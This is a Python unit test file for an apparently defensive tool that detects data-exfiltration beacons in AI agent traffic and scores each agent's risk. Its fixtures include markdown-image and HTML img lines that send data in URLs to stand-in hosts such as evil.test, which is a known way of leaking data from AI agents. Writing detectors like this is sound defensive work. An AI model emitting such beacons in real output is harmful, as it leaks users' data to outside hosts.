# SPDX-License-Identifier: AGPL-3.0-or-later
"""Unit tests for passive exfiltration-channel detection over agent traffic."""

from __future__ import annotations

from mas_sentry.agents.abfp.payload_exfil import (
    PayloadExfilTracker,
    scan_payload_exfil,
)
from mas_sentry.agents.abfp.scoring import WEIGHTS, compose


def _beacon(url: str = "https://evil.test/leak?d=abc") -> bytes:
    return f'{{"result": "done ![x]({url})"}}'.encode()


# --- payload scanning ---


def test_scan_finds_markdown_beacon() -> None:
    assert scan_payload_exfil(_beacon()) == [("markdown-image", "https://evil.test/leak?d=abc")]


def test_scan_clean_payload_is_empty() -> None:
    assert scan_payload_exfil(b'{"result": "temperature 21C"}') == []


def test_scan_ignores_relative_and_data_uri() -> None:
    assert scan_payload_exfil(b"![a](/local.png) ![b](data:image/png;base64,AA)") == []


def test_scan_handles_non_utf8_bytes() -> None:
    assert scan_payload_exfil(b"\xff\xfe binary noise") == []


def test_scan_is_capped_to_scan_window() -> None:
    # A beacon past the 4096-byte cap is not scanned (loop-stall guard).
    payload = b"x" * 5000 + b"![x](https://evil.test/late)"
    assert scan_payload_exfil(payload) == []


# --- tracker ---


def test_tracker_ignores_clean_traffic() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "sensors/out", b'{"ok": true}')
    assert t.dimensions() == {}


def test_tracker_records_single_channel() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "sensors/out", _beacon())
    dims = t.dimensions()["agent-1"]
    assert len(dims) == 1
    d = dims[0]
    assert d.name == "exfil"
    assert d.raw == 0.55
    assert "markdown-image -> evil.test" in d.reason
    assert "sensors/out" in d.reason


def test_distinct_hosts_compound_the_score() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "a/out", _beacon("https://one.test/x"))
    t.observe("agent-1", "a/out", _beacon("https://two.test/y"))
    d = t.dimensions()["agent-1"][0]
    assert d.raw == 0.65
    assert "one.test" in d.reason and "two.test" in d.reason


def test_same_host_repeated_does_not_compound() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "a/out", _beacon("https://one.test/x"))
    t.observe("agent-1", "a/out", _beacon("https://one.test/other-path"))
    d = t.dimensions()["agent-1"][0]
    assert d.raw == 0.55  # same (kind, host) - one channel, two messages
    assert "2 message(s)" in d.reason


def test_distinct_kinds_compound_the_score() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "a/out", b'![x](https://one.test/a) <img src="https://one.test/b">')
    d = t.dimensions()["agent-1"][0]
    assert d.raw == 0.65


def test_score_is_capped_at_one() -> None:
    t = PayloadExfilTracker()
    for i in range(12):
        t.observe("agent-1", "a/out", _beacon(f"https://host{i}.test/x"))
    assert t.dimensions()["agent-1"][0].raw == 1.0


def test_agents_tracked_independently() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "a/out", _beacon())
    t.observe("agent-2", "b/out", b'{"clean": 1}')
    dims = t.dimensions()
    assert set(dims) == {"agent-1"}


# --- scoring integration ---


def test_exfil_weight_is_registered() -> None:
    # A dimension name missing from WEIGHTS is silently scored 0 by compose().
    assert WEIGHTS["exfil"] == 0.45


def test_single_channel_scores_medium_not_critical() -> None:
    t = PayloadExfilTracker()
    t.observe("agent-1", "a/out", _beacon())
    score = compose("agent-1", t.dimensions()["agent-1"])
    assert score.total == 55
    assert score.severity.value == "MEDIUM"
